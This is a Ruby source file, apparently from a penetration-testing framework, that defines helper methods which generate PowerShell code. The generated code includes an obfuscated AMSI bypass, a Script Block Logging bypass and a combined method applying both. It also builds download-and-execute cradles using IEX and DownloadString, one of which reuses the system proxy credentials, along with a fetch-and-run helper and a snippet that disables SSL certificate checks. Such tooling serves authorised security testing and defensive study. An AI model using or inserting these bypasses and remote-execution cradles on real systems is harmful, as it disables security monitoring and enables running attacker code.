# -*- coding: binary -*-

module Rex
module Powershell
  ##
  # Convenience methods for generating Powershell code in Ruby
  ##

  module PshMethods
    #
    # Download file via .NET WebClient
    #
    # @param src [String] URL to the file
    # @param target [String] Location to save the file
    #
    # @return [String] Powershell code to download a file
    def self.download(src, target)
      target ||= '$pwd\\' << src.split('/').last
      %Q^(new-object System.Net.WebClient).DownloadFile('#{src}', '#{target}')^
    end

    #
    # Download file via .NET WebClient and execute it afterwards
    #
    # @param src [String] URL to the file
    # @param target [String] Location to save the file
    #
    # @return [String] Powershell code to download a file
    def self.download_run(src, target)
      target ||= '$pwd\\' << src.split('/').last
      %Q^$z="#{target}"; (new-object System.Net.WebClient).DownloadFile('#{src}', $z); invoke-item $z^
    end

    #
    # Uninstall app, or anything named like app
    #
    # @param app [String] Name of application
    # @param fuzzy [Boolean] Whether to apply a fuzzy match (-like) to
    #   the application name
    #
    # @return [String] Powershell code to uninstall an application
    def self.uninstall(app, fuzzy = true)
      match = fuzzy ? '-like' : '-eq'
      %Q^$app = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name #{match} "#{app}" }; $app.Uninstall()^
    end

    #
    # Create secure string from plaintext
    #
    # @param str [String] String to create as a SecureString
    #
    # @return [String] Powershell code to create a SecureString
    def self.secure_string(str)
      %Q(ConvertTo-SecureString -string '#{str}' -AsPlainText -Force$)
    end

    #
    # Find PID of file lock owner
    #
    # @param filename [String] Filename
    #
    # @return [String] Powershell code to identify the PID of a file
    #   lock owner
    def self.who_locked_file(filename)
      %Q^ Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq "#{filename}"){$processVar.Name + " PID:" + $processVar.id}}}^
    end

    #
    # Return last time of login
    #
    # @param user [String] Username
    #
    # @return [String] Powershell code to return the last time of a user
    #   login
    def self.get_last_login(user)
      %Q^ Get-QADComputer -ComputerRole DomainController | foreach { (Get-QADUser -Service $_.Name -SamAccountName "#{user}").LastLogon} | Measure-Latest^
    end

    #
    # Disable SSL Certificate verification
    #
    # @return [String] Powershell code to disable SSL verification
    #   checks.
    def self.ignore_ssl_certificate
      '[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
    end

    #
    # Return mattifestation's AMSI bypass
    #
    # @return [String] PowerShell code to bypass AMSI
    def self.bypass_amsi()
      script = Script.new(<<-PSH
        $Ref=[Ref].Assembly.GetType(#{Obfu.scate_string_literal('System.Management.Automation.AmsiUtils')});
        $Ref.GetField(#{Obfu.scate_string_literal('amsiInitFailed')},'NonPublic,Static').SetValue($null,$true);
        PSH
      )
      script.sub_vars
      script
    end

    #
    # Return cobbr's Script Block Logging bypass
    #
    # @return [String] PowerShell code to bypass Script Block Logging
    def self.bypass_script_log()
      script = Script.new(<<-PSH
        $GPF=[ref].Assembly.GetType(#{Obfu.scate_string_literal('System.Management.Automation.Utils')}).GetField(#{Obfu.scate_string_literal('cachedGroupPolicySettings')},'NonPublic,Static');
        If ($GPF) {
            $SBL=#{Obfu.scate_string_literal('ScriptBlockLogging')};
            $EnableSBL=#{Obfu.scate_string_literal('EnableScriptBlockLogging')};
            $EnableSBIL=#{Obfu.scate_string_literal('EnableScriptBlockInvocationLogging')};
            $GPC=$GPF.GetValue($null);
            If($GPC[$SBL]){
                $GPC[$SBL][$EnableSBL]=0;
                $GPC[$SBL][$EnableSBIL]=0;
            }
            $val=[Collections.Generic.Dictionary[string,System.Object]]::new();
            $val.Add($EnableSBL,0);
            $val.Add($EnableSBIL,0);
            $GPC['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\'+$SBL]=$val;
        } Else {
            [ScriptBlock].GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]));
        }
        PSH
      )
      script.sub_vars
      script
    end

    #
    # Return all bypasses checking if PowerShell version > 3
    #
    # @return [String] PowerShell code to disable PowerShell Built-In Protections
    def self.bypass_powershell_protections()
      uglify_ps(%Q{
        If($PSVersionTable.PSVersion.Major -ge 3){
          #{self.bypass_script_log}
          #{self.bypass_amsi}
        }
      })
    end

    #
    # Download and execute string via HTTP
    #
    # @param urls [String | [String]] string(s) to download
    # @param iex [Boolean] utilize invoke-expression to execute code
    #
    # @return [String] PowerShell code to download and exec the url
    def self.download_and_exec_string(urls, iex = true)
      unless urls.is_a?(Array)
        urls = [urls]
      end

      res = ''
      for url in urls
        if iex
          res << %Q^IEX ((new-object Net.WebClient).DownloadString('#{url}'));^
        else
          res << %Q^&([scriptblock]::create((new-object Net.WebClient).DownloadString('#{url}')));^
        end
      end
      res
    end

    #
    # Force use of TLS1.2
    #
    # @ return [String] Powershell code to force use of TLS1.2
    def self.force_tls12()
      %Q^[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;^
    end

    #
    # Use the default system web proxy and credentials to download a URL
    # as a string and execute the contents as PowerShell
    #
    # @param urls [String | [String]] string(s) to download
    # @param iex [Boolean] utilize invoke-expression to execute code
    #
    # @return [String] PowerShell code to download a URL
    def self.proxy_aware_download_and_exec_string(urls, iex = true)
      var = Rex::Text.rand_text_alpha(1)
      cmd = "$#{var}=new-object net.webclient;"
      cmd << "if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){"
      cmd << "$#{var}.proxy=[Net.WebRequest]::GetSystemWebProxy();"
      cmd << "$#{var}.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
      cmd << "};"
      cmd << download_and_exec_string(urls, iex)
      cmd
    end

    def self.uglify_ps(script)
      return script.gsub(/\ +/, " ").gsub(/\n+/, '')
    end
  end
end
end
